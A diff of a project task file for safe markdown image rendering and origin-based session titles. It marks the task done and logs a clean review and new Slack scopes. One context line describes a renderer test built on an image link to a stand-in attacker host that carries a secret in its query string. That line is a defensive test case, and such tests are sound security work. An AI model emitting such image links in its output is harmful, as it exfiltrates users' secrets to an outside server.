@@ -3,7 +3,7 @@ id: U.2
 title: Safe markdown images and origin-based session titles
 milestone: U
 size: S
-status: in_progress
+status: done
 depends_on: [U.1]
 branch: task/U.2-images-and-titles
 ---
@@ -21,3 +21,4 @@ Renderer tests: an `![x](https://evil.example/a.png?d=secret)` image renders as 
 
 ## Log
 - 2026-10-16: added from U.1's review (Dom: yes); dispatched on task/U.2-images-and-titles.
+- 2026-10-16: review clean after 0 fix rounds at d30432f (docs/reviews/tasks/U.2.md). Merged. Slack manifest gains channels:read and groups:read; existing apps need a reinstall for channel titles.
